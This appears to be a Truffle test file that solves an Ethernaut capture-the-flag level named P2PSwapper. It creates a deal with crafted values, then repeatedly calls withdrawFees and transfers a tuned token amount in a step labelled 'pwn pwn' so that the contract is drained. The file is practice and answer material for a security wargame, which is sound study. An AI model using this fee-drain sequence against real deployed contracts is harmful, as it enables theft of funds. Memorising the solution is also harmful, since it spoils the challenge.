const Factory = artifacts.require('./levels/P2PSwapperFactory.sol')
const Instance = artifacts.require('./levels/P2PSwapper.sol')
const Ethernaut = artifacts.require('./Ethernaut.sol')

const { BN, constants, expectEvent, expectRevert, ether } = require('openzeppelin-test-helpers')
const utils = require('../utils/TestUtils')

const P2P_WETH = artifacts.require('P2P_WETH')

contract('P2PSwapper', function(accounts) {

  let ethernaut
  let level
  let owner = accounts[1]
  let player = accounts[0]
  let player2 = accounts[2]
  let player3 = accounts[3]
  let player4 = accounts[4]

  before(async function() {
    ethernaut = await Ethernaut.new();
    level = await Factory.new()
    await ethernaut.registerLevel(level.address)
  });

  it('should allow the player to solve the level', async function() {

    instance = await utils.createLevelInstance(
      ethernaut, level.address, player, Instance,
      {from: player, value: ether('1')}
    )

    assert(instance);
  });

  it('create deal', async function() {
    p2pweth_address = await instance.p2pweth()
    p2pweth = await P2P_WETH.at(p2pweth_address)
    await p2pweth.deposit({from: player, value: ether('1')})
    await p2pweth.approve(instance.address, ether('10'), {from: player})
    await instance.createDeal(
      p2pweth_address,
      //'0xf0D7de80A1C242fA3C738b083C422d65c6c7ABF1',
      1,
      p2pweth_address,
      //'0xf0D7de80A1C242fA3C738b083C422d65c6c7ABF1',
      1,
      {from: player, value: 3133338}
    )
  });

  it('withdraw fees', async function() {
    await instance.withdrawFees(
      player2,
      {from: player}
    )

    await instance.withdrawFees(
      player3,
      {from: player}
    )

  });

  it('pwn pwn', async function() {
    await p2pweth.transfer(instance.address, 1253330)
    
    await instance.withdrawFees(
      player4,
      {from: player}
    )
  })

  it('solved', async function() {
    // Factory check
    const ethCompleted = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player
    )

    assert.equal(ethCompleted, true)
  })

});
